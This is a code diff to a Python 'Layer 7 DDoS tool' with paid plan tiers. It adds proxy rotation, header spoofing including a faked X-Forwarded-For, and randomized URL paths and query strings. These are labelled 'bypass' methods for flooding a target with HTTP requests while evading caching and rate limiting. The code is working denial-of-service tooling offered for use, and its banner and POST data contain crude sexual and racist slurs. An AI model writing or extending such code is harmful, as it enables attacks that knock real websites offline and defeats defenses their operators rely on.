@@ -1,8 +1,8 @@
 """"
     ┌──────────────────────────────────────┐
-    │      LAYER 7 ATTACK TOOL             │
-    │      CUM FOR ME DDOSER !             │
-    │      SPRAY YOUR PAYLOAD IN MY PORT ! │
+    │      LAYER 7 DDOS TOOL                │
+    │      WITH PROXY ROTATION & BYPASS     │
+    │      SPRAY YOUR PAYLOAD IN MY PORT !  │
     └──────────────────────────────────────┘
 """
     
@@ -139,14 +139,14 @@ PLANS = {
         'name': 'Pro Plan',
         'workers': 1000,
         'duration': 3600,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST','CONCURRENT HOLD','SOCKET-AMP'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'DNS-AMP', 'STRESS TEST','CONCURRENT HOLD','SOCKET-AMP', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
         '76034a9f5bef30b9dee701711d30bed6': ['p3r7o9k2', 'l8i4u6y1', 't5g9h3j7']
     },
     'VIP': {
         'name': 'VIP Plan',
         'workers': 1500,
         'duration': 9500,
-        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD','SOCKET-AMP','NET-BYPASS'],
+        'methods': ['HTTP GET', 'HTTPS GET', 'HTTP POST', 'HTTPS POST', 'CURL', 'GET/POST MIX', 'BROWSER', 'HULK', 'DNS-AMP', 'STRESS TEST', 'TLS-VIP', 'CONCURRENT HOLD','SOCKET-AMP','NET-BYPASS', 'BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH'],
         '76034a9f5bef30b9dee701711d30bed6': ['v9i2p8k4', 'z7x3c6v1', 'w4q8e2r5','xyz','.']
     }
 }
@@ -300,13 +300,36 @@ USER_AGENTS = {
         'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1',
         'Mozilla/5.0 (Windows NT 6.1; rv:90.0) Gecko/20100101 Firefox/90.0',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
-        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36'
+        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
+        'Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/19A346 Safari/604.1'
     ]
 }
 
+# Proxy settings
+proxies_enabled = False
+proxy_list = []
+
+def load_proxies(file_path="proxies.txt"):
+    global proxy_list
+    try:
+        with open(file_path, 'r') as f:
+            proxy_list = [line.strip() for line in f if line.strip()]
+        print(f"  Loaded {len(proxy_list)} proxies from {file_path}")
+    except FileNotFoundError:
+        print(f"  {file_path} not found. Using no proxies.")
+        proxy_list = []
+    except Exception as e:
+        print(f"  Error loading proxies: {e}")
+        proxy_list = []
+
+def get_random_proxy():
+    if proxy_list:
+        return random.choice(proxy_list)
+    return None
+
 def get_random_user_agent():
-    device_type = random.choice(list(USER_AGENTS.keys()))
-    return device_type, random.choice(USER_AGENTS[device_type])
+    # device_type no longer used, kept for compatibility
+    return random.choice(USER_AGENTS['user_agents'])
 
 def c(text):
     return f"{current_color}{text}{RESET}"
@@ -328,16 +351,17 @@ def header():
 {RESET}
 {current_color} User: {plan_info['name']} •{RESET}
 {current_color}
-  ┌────────────────────────────────┐
-  │ [1] Launch Attack              │
-  │ [2] Methods+                   │
-  │ [3] Color Schemes              │
-  │ [4] View Workers               │
-  │ [5] Plans+                     │
-  │ [6] Change ASCII Menu          │
-  │ [7] Refresh                    │
-  │ [0] Exit                       │
-  └────────────────────────────────┘
+  ┌────────────────────────────────────┐
+  │ [1] Launch Attack                  │
+  │ [2] Methods+                       │
+  │ [3] Color Schemes                  │
+  │ [4] View Workers                   │
+  │ [5] Plans+                         │
+  │ [6] Change ASCII Menu              │
+  │ [7] Refresh                        │
+  │ [8] Proxy Settings                  │
+  │ [0] Exit                           │
+  └────────────────────────────────────┘
 {RESET}""")
 
 stats = {
@@ -350,11 +374,31 @@ stats = {
     "active_agents": [],
 }
 
+def generate_random_path(base_url):
+    """Append a random path and query string to the base URL for bypass."""
+    paths = ['/api', '/v1', '/data', '/stats', '/images', '/css', '/js', '/admin', '/login', '/wp-admin', '/wp-content', '/assets', '/public']
+    extensions = ['', '.php', '.asp', '.jsp', '.html', '.htm', '.aspx']
+    path = random.choice(paths) + random.choice(extensions) if random.random() > 0.3 else ''
+    query = f"?{random.randint(1000,9999)}={random.randint(1,100)}&_={int(time.time())}" if random.random() > 0.5 else ''
+    return base_url.rstrip('/') + path + query
+
+def generate_random_headers():
+    """Generate a dict of headers with random values for bypass."""
+    headers = {
+        'Accept': random.choice(['text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'application/json, text/plain, */*', 'image/webp,*/*']),
+        'Accept-Language': random.choice(['en-US,en;q=0.5', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.7']),
+        'Referer': random.choice(['https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/', 'https://duckduckgo.com/', '']),
+        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}",
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache'
+    }
+    return headers
+
 async def http_worker(session, url, end_time, worker_id, method):
-    device_type, user_agent = get_random_user_agent()
+    user_agent = get_random_user_agent()
     stats["active_agents"].append({
         'id': worker_id,
-        'device': device_type,
+        'device': 'unknown',  # kept for compatibility
         'agent': user_agent
     })
     
@@ -366,12 +410,24 @@ async def http_worker(session, url, end_time, worker_id, method):
             'X-Load-Test': 'true'
         })
     
+    # For bypass methods, add extra randomisation
+    if method in ['BYPASS-GET', 'BYPASS-POST', 'RANDOM-PATH']:
+        headers.update(generate_random_headers())
+    
     while stats["running"] and time.time() < end_time:
         try:
             start = time.perf_counter()
             
+            # Choose proxy if enabled
+            proxy = get_random_proxy() if proxies_enabled else None
+            
+            # Build request URL with optional random path
+            request_url = url
+            if method in ['RANDOM-PATH', 'BYPASS-GET', 'BYPASS-POST']:
+                request_url = generate_random_path(url)
+            
             if method == 'HTTP GET':
-                async with session.get(url.replace('https://', 'http://'), headers=headers, timeout=10) as resp:
+                async with session.get(request_url.replace('https://', 'http://'), headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
@@ -379,20 +435,24 @@ async def http_worker(session, url, end_time, worker_id, method):
                     stats["requests"] += 1
                     
             elif method == 'HTTPS GET':
-                async with session.get(url if url.startswith('https') else url.replace('http://', 'https://'), 
-                                      headers=headers, timeout=10) as resp:
+                async with session.get(request_url if request_url.startswith('https') else request_url.replace('http://', 'https://'), 
+                                      headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
                     stats["status_codes"][resp.status] += 1
                     stats["requests"] += 1
                     
-            elif method in ['HTTP POST', 'HTTPS POST']:
-                post_url = url
+            elif method in ['HTTP POST', 'HTTPS POST', 'BYPASS-POST']:
+                post_url = request_url
                 if method == 'HTTP POST':
-                    post_url = url.replace('https://', 'http://')
+                    post_url = request_url.replace('https://', 'http://')
                 data = {'niggadih': 'cumdata', 'bot_id': worker_id, 'timestamp': time.time()}
-                async with session.post(post_url, headers=headers, json=data, timeout=10) as resp:
+                # add random data for bypass
+                if method == 'BYPASS-POST':
+                    data['rand'] = random.randint(1,1000000)
+                    data['session'] = ''.join(random.choices('abcdef0123456789', k=16))
+                async with session.post(post_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
@@ -400,7 +460,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                     stats["requests"] += 1
                     
             elif method == 'CURL':
-                async with session.get(url, headers=headers, timeout=10) as resp:
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
@@ -409,7 +469,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                     
             elif method == 'GET/POST MIX':
                 if random.random() > 0.5:
-                    async with session.get(url, headers=headers, timeout=10) as resp:
+                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                         await resp.read()
                         latency = time.perf_counter() - start
                         stats["latencies"].append(latency)
@@ -417,7 +477,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                         stats["requests"] += 1
                 else:
                     data = {'test': 'data', 'worker_id': worker_id}
-                    async with session.post(url, headers=headers, json=data, timeout=10) as resp:
+                    async with session.post(request_url, headers=headers, json=data, timeout=10, proxy=proxy) as resp:
                         await resp.read()
                         latency = time.perf_counter() - start
                         stats["latencies"].append(latency)
@@ -425,7 +485,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                         stats["requests"] += 1
                         
             elif method in ['BROWSER', 'HULK']:
-                async with session.get(url, headers=headers, timeout=10) as resp:
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
@@ -433,7 +493,7 @@ async def http_worker(session, url, end_time, worker_id, method):
                     stats["requests"] += 1
                     
             elif method == 'DNS-AMP':
-                async with session.get(url, headers=headers, timeout=8) as resp:
+                async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                     await resp.read()
                     latency = time.perf_counter() - start
                     stats["latencies"].append(latency)
@@ -442,14 +502,14 @@ async def http_worker(session, url, end_time, worker_id, method):
                     
             elif method == 'STRESS TEST':
                 for _ in range(50):
-                    async with session.get(url, headers=headers, timeout=8) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
             elif method == 'TLS-VIP':
                 for _ in range(5):
-                    async with session.get(url, headers=headers, timeout=8) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
@@ -457,31 +517,41 @@ async def http_worker(session, url, end_time, worker_id, method):
             elif method == 'CONCURRENT HOLD':
                 for _ in range(99):
                     if random.random() > 0.5:
-                        async with session.get(url, headers=headers, timeout=8) as resp:
+                        async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                             await resp.read()
                             stats["requests"] += 1
                             stats["status_codes"][resp.status] += 1
                     else:
-                        async with session.post(url, headers=headers, json={'data': 'test'}, timeout=8) as resp:
+                        async with session.post(request_url, headers=headers, json={'data': 'test'}, timeout=8, proxy=proxy) as resp:
                             await resp.read()
                             stats["requests"] += 1
                             stats["status_codes"][resp.status] += 1
                             
             elif method == 'SOCKET-AMP':
                 for _ in range(5):
-                    async with session.get(url, headers=headers, timeout=10) as resp:
+                    async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
                         
             elif method == 'NET-BYPASS':
                 for _ in range(100):
-                    async with session.get(url, headers=headers, timeout=8) as resp:
+                    async with session.get(request_url, headers=headers, timeout=8, proxy=proxy) as resp:
                         await resp.read()
                         stats["requests"] += 1
                         stats["status_codes"][resp.status] += 1
 
-           
+            elif method == 'BYPASS-GET':
+                # Already handled above (RANDOM-PATH + random headers)
+                async with session.get(request_url, headers=headers, timeout=10, proxy=proxy) as resp:
+                    await resp.read()
+                    latency = time.perf_counter() - start
+                    stats["latencies"].append(latency)
+                    stats["status_codes"][resp.status] += 1
+                    stats["requests"] += 1
+
+            # 'BYPASS-POST' already handled in POST section
+            # 'RANDOM-PATH' handled in GET section (will fall through to HTTP GET/HTTPS GET)
                     
         except Exception:
             stats["errors"] += 1
@@ -559,7 +629,11 @@ async def run_load_test():
     print(f"  Method: {method}")
     print(f"  Target: {url}")
     print(f"  Workers: {workers}")
-    print(f"  Duration: {duration}s\n")
+    print(f"  Duration: {duration}s")
+    if proxies_enabled:
+        print(f"  Proxies: Enabled ({len(proxy_list)} loaded)")
+    else:
+        print(f"  Proxies: Disabled")
 
     stats["start_time"] = time.time()
     stats["requests"] = 0
@@ -594,6 +668,7 @@ async def run_load_test():
                 print(f"{current_color}  Target: {RESET}{url}")
                 print(f"{current_color}  Workers: {RESET}{workers}")
                 print(f"{current_color}  Time: {RESET}{elapsed:.1f}s / {duration}s")
+                print(f"{current_color}  Proxies: {RESET}{'Enabled' if proxies_enabled else 'Disabled'}")
                 print(f"\n{current_color}{BOLD}  Performance Metrics:{RESET}")
                 print(f"    Requests: {stats['requests']:,}")
                 print(f"    Errors: {stats['errors']:,}")
@@ -660,10 +735,26 @@ def view_test_agents():
     print(f"  Showing {num_entries} Workers:\n")
     
     for i in range(num_entries):
-        device_type, user_agent = get_random_user_agent()
+        user_agent = get_random_user_agent()
         entry_num = random.randint(1, 100)
         
-        device_display = device_type.replace('_', ' ').title()
+        # Simple device detection from UA (just for display)
+        if 'Mobile' in user_agent:
+            device_display = 'Mobile'
+        elif 'iPad' in user_agent:
+            device_display = 'iPad'
+        elif 'Android' in user_agent:
+            device_display = 'Android'
+        elif 'iPhone' in user_agent:
+            device_display = 'iPhone'
+        elif 'Linux' in user_agent:
+            device_display = 'Linux'
+        elif 'Windows' in user_agent:
+            device_display = 'Windows'
+        elif 'Mac' in user_agent:
+            device_display = 'macOS'
+        else:
+            device_display = 'Unknown'
         
         print(f"{current_color}  [{entry_num}] {RESET}{device_display}")
         print(f"         {user_agent[:80]}...")
@@ -758,6 +849,34 @@ def change_ascii_menu():
         print(f"\n  Invalid input")
         time.sleep(1)
 
+def proxy_settings():
+    global proxies_enabled, proxy_list
+    clear_screen()
+    print(f"{current_color}{BOLD}╔══ PROXY SETTINGS ══╗{RESET}\n")
+    print(f"  Proxies: {'Enabled' if proxies_enabled else 'Disabled'}")
+    print(f"  Proxies loaded: {len(proxy_list)}")
+    print("\n  Options:")
+    print("  [1] Toggle proxies on/off")
+    print("  [2] Load proxies from file")
+    print("  [3] Clear proxy list")
+    print("  [0] Back")
+    
+    choice = input(f"\n  Select → ").strip()
+    if choice == '1':
+        proxies_enabled = not proxies_enabled
+        print(f"  Proxies now {'enabled' if proxies_enabled else 'disabled'}.")
+        time.sleep(1)
+    elif choice == '2':
+        file = input("  Proxy file path (default: proxies.txt) → ").strip() or "proxies.txt"
+        load_proxies(file)
+        time.sleep(2)
+    elif choice == '3':
+        proxy_list = []
+        print("  Proxy list cleared.")
+        time.sleep(1)
+    else:
+        return
+
 def main():
     while True:
         header()
@@ -789,6 +908,9 @@ def main():
             clear_screen()
             print(f"\033[2J\033[H")
             time.sleep(0.3)
+
+        elif choice == "8":
+            proxy_settings()
 
         else:
             print(f"  Invalid selection.")
